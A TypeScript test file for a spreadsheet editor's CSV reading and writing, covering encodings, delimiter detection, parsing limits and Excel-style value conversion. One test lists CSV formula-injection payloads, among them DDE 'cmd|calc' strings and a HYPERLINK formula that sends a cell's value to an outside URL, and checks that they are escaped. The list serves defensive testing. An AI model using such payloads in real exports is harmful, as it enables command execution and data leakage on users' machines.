import { strToU8 } from 'fflate';
import { describe, expect, it } from 'vitest';
import { decodeText, escapeFormula, parseCsv, sepLine, sniffDelimiter, writeCsv } from '../src/core/csv';
import { csvValue, sheetNameFor } from '../src/core/csvWorkbook';
import { listSeparator } from '../src/core/locale';
import { WorkbookSession } from '../src/core/session';
import { english, errorText } from '../src/i18n';
import { loadedFormula, loadedValue, parts } from './helpers';

/** The fields of CSV text as rows, with empty strings where a row has nothing. */
function rows(text: string, delimiter = ',', maxCells = 1_000_000): string[][] {
  const out: string[][] = [];
  parseCsv(text, delimiter, (r, c, v) => ((out[r] ??= [])[c] = v), maxCells);
  return Array.from(out, (row) => Array.from(row ?? [], (v) => v ?? ''));
}

/** What was thrown, in English. */
function refusal(fn: () => unknown): string | undefined {
  try {
    fn();
  } catch (e) {
    return english.text(errorText(e));
  }
  return undefined;
}

const utf16 = (s: string, bigEndian: boolean) => {
  const out = new Uint8Array(2 + s.length * 2);
  out.set(bigEndian ? [0xfe, 0xff] : [0xff, 0xfe]);
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i);
    out[2 + i * 2 + (bigEndian ? 1 : 0)] = c & 0xff;
    out[2 + i * 2 + (bigEndian ? 0 : 1)] = c >> 8;
  }
  return out;
};

describe('reading the text of a CSV file', () => {
  it('follows a byte order mark, for UTF-8 and UTF-16 either way round', () => {
    expect(decodeText(new Uint8Array([0xef, 0xbb, 0xbf, ...strToU8('Größe,€')]))).toEqual({ text: 'Größe,€', encoding: 'utf-8' });
    expect(decodeText(utf16('a,ü\r\n', false))).toEqual({ text: 'a,ü\r\n', encoding: 'utf-16le' });
    expect(decodeText(utf16('a,ü\r\n', true))).toEqual({ text: 'a,ü\r\n', encoding: 'utf-16be' });
  });

  it('reads UTF-8 without a byte order mark when the bytes are valid UTF-8', () => {
    expect(decodeText(strToU8('Zürich,東京,😀'))).toEqual({ text: 'Zürich,東京,😀', encoding: 'utf-8' });
    expect(decodeText(strToU8('plain'))).toEqual({ text: 'plain', encoding: 'utf-8' });
  });

  it('falls back to Windows-1252 when they are not, euro sign and curly quotes included', () => {
    // "Café €5 “quoted” Œ" as Excel writes it on Western Windows.
    const bytes = new Uint8Array([0x43, 0x61, 0x66, 0xe9, 0x20, 0x80, 0x35, 0x20, 0x93, 0x71, 0x94, 0x20, 0x8c, 0x81]);
    expect(decodeText(bytes)).toEqual({ text: 'Café €5 “q” Œ\u0081', encoding: 'windows-1252' });
  });
});

describe('finding the delimiter', () => {
  it('takes the one that splits every record the same way', () => {
    expect(sniffDelimiter('a,b,c\n1,2,3\n4,5,6')).toBe(',');
    expect(sniffDelimiter('a\tb\n1, 2\t3')).toBe('\t');
    expect(sniffDelimiter('Name;Price\nBolts;1,50\nNuts;0,25\n')).toBe(';');
  });

  it("settles a tie with the locale's list separator, as Excel always uses that", () => {
    expect(sniffDelimiter('1,5;2,5\r\n3,5;4,5\r\n', ';')).toBe(';');
    expect(sniffDelimiter('1,5;2,5\r\n3,5;4,5\r\n', ',')).toBe(',');
    expect(sniffDelimiter('a\tb;c', ';')).toBe(';');
    expect(sniffDelimiter('a\tb;c', ',')).toBe('\t');
  });

  it('ignores delimiters inside quotes, line breaks included', () => {
    expect(sniffDelimiter('"a;b",c\n"x\n;y",z\n')).toBe(',');
    expect(sniffDelimiter('"1,5";"2,5"\n"3,5";"4"')).toBe(';');
    expect(sniffDelimiter('"Müller, Hans";Berlin\n"Weber, Eva";Bonn')).toBe(';');
  });

  it('goes by the most records when rows are ragged, and falls back when nothing splits', () => {
    expect(sniffDelimiter('a,b,c\n1,2\n3,4,5\nx;y')).toBe(',');
    expect(sniffDelimiter('one column\nof text')).toBe(',');
    expect(sniffDelimiter('single', '\t')).toBe('\t');
    expect(sniffDelimiter('')).toBe(',');
  });

  it('decides from the start of a long file, leaving out a record the sample cuts short', () => {
    const text = 'a;b\n'.repeat(20_000) + 'x,y,z';
    expect(sniffDelimiter(text)).toBe(';');
    expect(sniffDelimiter('a;b\n'.repeat(17_000) + 'c,d')).toBe(';');
  });

  it("follows Excel's sep= line", () => {
    expect(sepLine('sep=;\r\na;b')).toEqual({ delimiter: ';', start: 7 });
    expect(sepLine('SEP=|\na|b')).toEqual({ delimiter: '|', start: 6 });
    expect(sepLine('sep=,')).toEqual({ delimiter: ',', start: 5 });
    expect(sepLine('sep=;;\na')).toBeUndefined();
    expect(sepLine('a,b')).toBeUndefined();
  });

  it("takes Windows' list separator as the delimiter to write", () => {
    expect(['en-US', 'en-GB', 'de-DE', 'fr-FR', 'de-CH', 'it-CH', 'nl-NL', 'ja-JP'].map(listSeparator)).toEqual([',', ',', ';', ';', ';', ';', ';', ',']);
  });
});

describe('splitting CSV into fields', () => {
  it('reads plain records with CRLF, LF or CR line ends', () => {
    expect(rows('a,b\r\nc,d\ne,f\rg,h')).toEqual([
      ['a', 'b'],
      ['c', 'd'],
      ['e', 'f'],
      ['g', 'h'],
    ]);
  });

  it('reads quoted fields with delimiters, doubled quotes and line breaks inside', () => {
    expect(rows('"a,b","say ""hi""","line 1\r\nline 2",x\n"",""""\n')).toEqual([
      ['a,b', 'say "hi"', 'line 1\nline 2', 'x'],
      ['', '"'],
    ]);
    expect(rows('"cr\ronly";"lf\nonly"', ';')).toEqual([['cr\nonly', 'lf\nonly']]);
  });

  it('keeps text after a closing quote and quotes inside an unquoted field, as Excel does', () => {
    expect(rows('"ab"c,d\na"b,"x" ')).toEqual([
      ['abc', 'd'],
      ['a"b', 'x '],
    ]);
  });

  it('runs a quote that never closes to the end of the file', () => {
    expect(rows('a,"b,c\nd')).toEqual([['a', 'b,c\nd']]);
  });

  it('keeps empty lines as empty rows, ragged rows as they are, and adds no row for the last line end', () => {
    expect(rows('a\n\nb,c,d\ne\n')).toEqual([['a'], [], ['b', 'c', 'd'], ['e']]);
    expect(rows(',,x\n,\n')).toEqual([['', '', 'x']]);
    expect(rows('')).toEqual([]);
    expect(rows('\n\n')).toEqual([]);
  });

  it('splits on any one-character delimiter', () => {
    expect(rows('a|b\tc', '|')).toEqual([['a', 'b\tc']]);
    expect(rows('a\tb,c', '\t')).toEqual([['a', 'b,c']]);
  });

  it('refuses more values than allowed, counting only the ones that are there', () => {
    expect(refusal(() => rows('1,2\n3,4', ',', 4))).toBeUndefined();
    expect(refusal(() => rows(',,,,1,,,,\n,,,', ',', 1))).toBeUndefined();
    expect(refusal(() => rows('1,2\n3,4,5', ',', 4))).toBe('This CSV file has more than 4 values, the most this editor can hold.');
  });

  it('refuses more rows or columns than a sheet has', () => {
    expect(refusal(() => rows(','.repeat(16_383) + 'x'))).toBeUndefined();
    expect(refusal(() => rows(','.repeat(16_384) + 'x'))).toBe('This CSV file has more than 16,384 columns, the most a sheet can hold.');
    expect(refusal(() => rows('\n'.repeat(1_048_575) + 'x'))).toBeUndefined();
    expect(refusal(() => rows('\n'.repeat(1_048_576) + 'x'))).toBe('This CSV file has more than 1,048,576 rows, the most a sheet can hold.');
  });

  it('refuses a value longer than a cell holds, which is usually a quote left open', () => {
    const long = 'x'.repeat(32_768);
    expect(refusal(() => rows(`a\nb,${'y'.repeat(32_767)}`))).toBeUndefined();
    const message = 'Row 2 of this CSV file has a value longer than 32,767 characters, the most a cell can hold. A quote may be missing its closing quote.';
    expect(refusal(() => rows(`a\nb,${long}`))).toBe(message);
    expect(refusal(() => rows(`a\nb,"${long}"`))).toBe(message);
    expect(refusal(() => rows(`a\nb,"${'""'.repeat(40_000)}"`))).toBe(message);
    expect(refusal(() => rows(`a\nb,"open\n${'more,text\n'.repeat(5_000)}`))).toBe(message);
  });

  it('gets through a large file quickly', () => {
    const line = '12345,"some, quoted text",3.5,TRUE,,x\r\n';
    const text = line.repeat(100_000);
    const t0 = performance.now();
    let n = 0;
    parseCsv(text, ',', () => n++, 2_000_000);
    expect(n).toBe(500_000);
    expect(performance.now() - t0).toBeLessThan(2000);
  });
});

describe('values, as Excel reads them from a CSV file', () => {
  const read = (text: string, locale = 'en-US') => csvValue(text, locale);

  it('reads numbers, percentages, currencies, dates, logicals and errors, implying formats', () => {
    expect(read('42')).toEqual({ content: { kind: 'number', value: 42 } });
    expect(read('-1,234.5')).toEqual({ content: { kind: 'number', value: -1234.5 }, numFmt: '#,##0.00' });
    expect(read('12%')).toEqual({ content: { kind: 'number', value: 0.12 }, numFmt: '0%' });
    expect(read('$1,234.00').numFmt).toBe('$#,##0.00');
    expect(read('2026-03-04')).toEqual({ content: { kind: 'number', value: 46085 }, numFmt: 'yyyy-mm-dd' });
    expect(read('TRUE')).toEqual({ content: { kind: 'bool', value: true } });
    expect(read('#N/A')).toEqual({ content: { kind: 'error', value: '#N/A' } });
    expect(read('hello')).toEqual({ content: { kind: 'string', value: 'hello' } });
    expect(read(' false ')).toEqual({ content: { kind: 'bool', value: false } });
    expect(read('#DIV/0!')).toEqual({ content: { kind: 'error', value: '#DIV/0!' } });
    expect(read('#tag')).toEqual({ content: { kind: 'string', value: '#tag' } });
  });

  it('loses leading zeros and digits past the fifteenth, as Excel does', () => {
    expect(read('007').content).toEqual({ kind: 'number', value: 7 });
    expect(read('12345678901234567890').content).toEqual({ kind: 'number', value: 12345678901234500000 });
  });

  it('reads dates and decimals in the locale', () => {
    expect(read('3/4/2026', 'en-US').content).toEqual({ kind: 'number', value: 46085 });
    expect(read('3/4/2026', 'en-GB').content).toEqual({ kind: 'number', value: 46115 });
    expect(read('1.234,5', 'de-DE').content).toEqual({ kind: 'number', value: 1234.5 });
  });

  it('never makes a formula, and keeps a leading apostrophe', () => {
    for (const text of ['=1+2', '=HYPERLINK("http://example.com","x")', '-A1', '+A1*2', '@SUM(A1)', "'007", "'=1+2"]) {
      expect(read(text).content, text).toEqual({ kind: 'string', value: text });
    }
    expect(read('-5').content).toEqual({ kind: 'number', value: -5 });
    expect(read('+5').content).toEqual({ kind: 'number', value: 5 });
  });

  it('names the sheet after the file, as Excel does, within what sheet names allow', () => {
    expect(sheetNameFor('Prices.csv')).toBe('Prices');
    expect(sheetNameFor('C:\\exports\\q1 [draft]: v2?.TSV')).toBe('q1 _draft__ v2_');
    expect(sheetNameFor("'quoted'.csv")).toBe('quoted');
    expect(sheetNameFor('a very long file name that goes on and on.csv')).toBe('a very long file name that goes');
    expect(sheetNameFor('.csv')).toBe('Sheet1');
  });
});

describe('writing CSV', () => {
  it('quotes fields with the delimiter, quotes or line breaks, and ends every row with CRLF', () => {
    expect(writeCsv([['a', 'b,c', 'say "hi"'], ['line 1\nline 2', '', 'cr\r']], ',')).toBe('a,"b,c","say ""hi"""\r\n"line 1\nline 2",,"cr\r"\r\n');
    expect(writeCsv([['1,5', 'a;b', 't\tab']], ';')).toBe('1,5;"a;b";t\tab\r\n');
    expect(writeCsv([['1,5', 'a;b', 't\tab']], '\t')).toBe('1,5\ta;b\t"t\tab"\r\n');
    expect(writeCsv([], ',')).toBe('');
  });

  it('escapes values a spreadsheet app would run as formulas', () => {
    const attacks = [
      '=1+1',
      "=cmd|' /C calc'!A0",
      '=HYPERLINK("http://example.com/?leak="&A1,"Click")',
      '+1+cmd|calc',
      '-2+3+cmd|calc',
      '@SUM(1+1)*cmd|calc',
      '\t=1+1',
      '\r=1+1',
      '＝1+1',
      '＋1',
      '－1',
      '＠SUM(A1)',
      '-',
      '+1 (555) 010-0199',
      '\t5',
      '\r-5',
      '-1e5+A1',
    ];
    for (const text of attacks) expect(escapeFormula(text), JSON.stringify(text)).toBe(`'${text}`);
  });

  it('leaves numbers, and text that only contains a formula character later on, as they are', () => {
    for (const text of ['-5', '+5', '-1,234.50', '-$5.00', '- € 1.234,50', '+12%', '-1.5E+10', "-1'234.5", 'a=b', '1-2', "'=1+1", '', 'TRUE']) {
      expect(escapeFormula(text), text).toBe(text);
    }
  });

  it('writes escaped values, quoting them when they need it, unless told not to', () => {
    expect(writeCsv([['=1+1', '=SUM(A1,B1)', '-5']], ',')).toBe(`'=1+1,"'=SUM(A1,B1)",-5\r\n`);
    expect(writeCsv([['=1+1', '=SUM(A1,B1)', '-5']], ',', false)).toBe('=1+1,"=SUM(A1,B1)",-5\r\n');
  });

  it('reads back what it wrote', () => {
    const values = [
      ['plain', 'with, comma', 'with "quotes"'],
      ['multi\nline', '', 'end'],
    ];
    expect(rows(writeCsv(values, ','))).toEqual(values);
    expect(rows(writeCsv(values, ';'), ';')).toEqual(values);
  });
});

describe('opening a CSV file', () => {
  const csv = (text: string, name = 'prices.csv', locale = 'en-US', options = {}) =>
    WorkbookSession.open(new Uint8Array([0xef, 0xbb, 0xbf, ...strToU8(text)]), name, locale, options);
  const fmt = (s: WorkbookSession, row: number, col: number) => s.model.styles.get(s.current(0, row, col).style).numFmt;

  it('opens it as a workbook of one sheet named after the file, that saves as .xlsx', () => {
    const s = csv('Item,Qty,Price,Share,Due,Done\r\nBolts,2,"1,234.50",12%,2026-03-04,TRUE\r\n=1+2,007,#N/A,-A1,,\r\n');
    expect(s.model.sheets.map((m) => m.info.name)).toEqual(['prices']);
    expect(s.fileName).toBe('prices.csv');
    expect(s.saveFileName).toBe('prices.xlsx');
    expect(['A1', 'B2', 'C2', 'D2', 'E2', 'F2', 'A3', 'B3', 'C3', 'D3'].map((ref) => loadedValue(s, 'prices', ref))).toEqual([
      'Item', 2, 1234.5, 0.12, 46085, true, '=1+2', 7, { error: '#N/A' }, '-A1',
    ]);
    expect([fmt(s, 1, 2), fmt(s, 1, 3), fmt(s, 1, 4), fmt(s, 1, 1)]).toEqual(['#,##0.00', '0%', 'yyyy-mm-dd', 'General']);
    // Text that looks like a formula is text: nothing to calculate.
    expect(loadedFormula(s, 'prices', 'A3')).toBeUndefined();
    expect(s.current(0, 2, 0).content).toEqual({ kind: 'string', value: '=1+2' });
    expect(s.ensureEngine().formulaCells).toBe(0);
  });

  it('saves a workbook that opens with the same values, and with edits', () => {
    const s = csv('a;1,5;31.12.2025\nb;2;\n', 'export.csv', 'de-DE');
    expect(['A1', 'B1', 'C1', 'B2'].map((ref) => loadedValue(s, 'export', ref))).toEqual(['a', 1.5, 46022, 2]);
    const unchanged = WorkbookSession.open(s.save(), 'export.xlsx', 'de-DE');
    expect(['A1', 'B1', 'C1', 'B2'].map((ref) => loadedValue(unchanged, 'export', ref))).toEqual(['a', 1.5, 46022, 2]);
    expect(unchanged.model.styles.get(unchanged.current(0, 0, 2).style).numFmt).toBe('dd/mm/yyyy');

    s.apply({ type: 'input', sheet: 0, row: 1, col: 2, text: '=B1+B2' });
    const edited = WorkbookSession.open(s.save(), 'export.xlsx', 'de-DE');
    expect(loadedFormula(edited, 'export', 'C2')).toBe('B1+B2');
    expect(loadedValue(edited, 'export', 'C2')).toBe(3.5);
    const files = parts(s.save());
    expect(Object.keys(files).sort()).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'xl/_rels/workbook.xml.rels',
      'xl/sharedStrings.xml',
      'xl/styles.xml',
      'xl/workbook.xml',
      'xl/worksheets/sheet1.xml',
    ]);
    expect(files['xl/worksheets/sheet1.xml']).toContain('<dimension ref="A1:C2"/>');
  });

  it('keeps text exactly: spaces, line breaks, markup and characters XML cannot hold', () => {
    const s = csv(' padded ,"two\r\nlines",<b>&amp;</b>,"bell\u0007",_x0041_\nnext,row,,,\n');
    expect(['A1', 'B1', 'C1', 'D1', 'E1'].map((ref) => loadedValue(s, 'prices', ref))).toEqual([' padded ', 'two\nlines', '<b>&amp;</b>', 'bell\u0007', '_x0041_']);
  });

  it('reads tab-separated .tsv and .txt files, and a sep= line', () => {
    expect(loadedValue(csv('a,b\tc', 'x.tsv'), 'x', 'B1')).toBe('c');
    expect(loadedValue(csv('a,b\tc', 'x.txt'), 'x', 'B1')).toBe('c');
    expect(loadedValue(csv('sep=;\na,b;c', 'x.csv'), 'x', 'A1')).toBe('a,b');
    expect(loadedValue(csv('sep=;\na,b;c', 'x.csv'), 'x', 'B1')).toBe('c');
  });

  it('opens an empty file as an empty sheet', () => {
    const s = csv('', 'empty.csv');
    expect(s.model.sheets[0].info.maxRow).toBe(-1);
    expect(loadedValue(WorkbookSession.open(s.save(), 'empty.xlsx'), 'empty', 'A1')).toBeNull();
  });

  it('holds the file to the size and cell limits workbooks have', () => {
    const tooBig = refusal(() => csv('x'.repeat(2 * 1024 * 1024), 'big.csv', 'en-US', { limits: { maxFileBytes: 1024 * 1024 } }));
    expect(tooBig).toBe('This file is 2 MB; the most this editor accepts is 1 MB.');
    expect(refusal(() => csv('1,2,3\n4,5,6', 'many.csv', 'en-US', { limits: { maxCells: 5 } }))).toBe('This CSV file has more than 5 values, the most this editor can hold.');
    expect(refusal(() => csv('1,2,3\n4,5', 'many.csv', 'en-US', { limits: { maxCells: 5 } }))).toBeUndefined();
  });

  it('opens a large file in time proportional to its size', () => {
    const text = 'id,name,amount,date,flag,note\r\n' + Array.from({ length: 10_000 }, (_, i) => `${i},"Name ${i % 977}",${i * 1.25},2026-01-${(i % 28) + 1},TRUE,x`).join('\r\n');
    const t0 = performance.now();
    const s = csv(text, 'large.csv');
    expect(s.model.sheets[0].info.maxRow).toBe(10_000);
    expect(loadedValue(s, 'large', 'C10001')).toBe(9_999 * 1.25);
    // A quarter of a second, but slow machines running tests in parallel can take many times that.
    expect(performance.now() - t0).toBeLessThan(15_000);
  });

  it('treats a binary file named .csv as text, without failing', () => {
    const junk = new Uint8Array(4096);
    for (let i = 0; i < junk.length; i++) junk[i] = (i * 7919) % 256;
    const s = WorkbookSession.open(junk, 'junk.csv');
    expect(s.model.sheets).toHaveLength(1);
    expect(() => WorkbookSession.open(s.save(), 'junk.xlsx')).not.toThrow();
  });
});
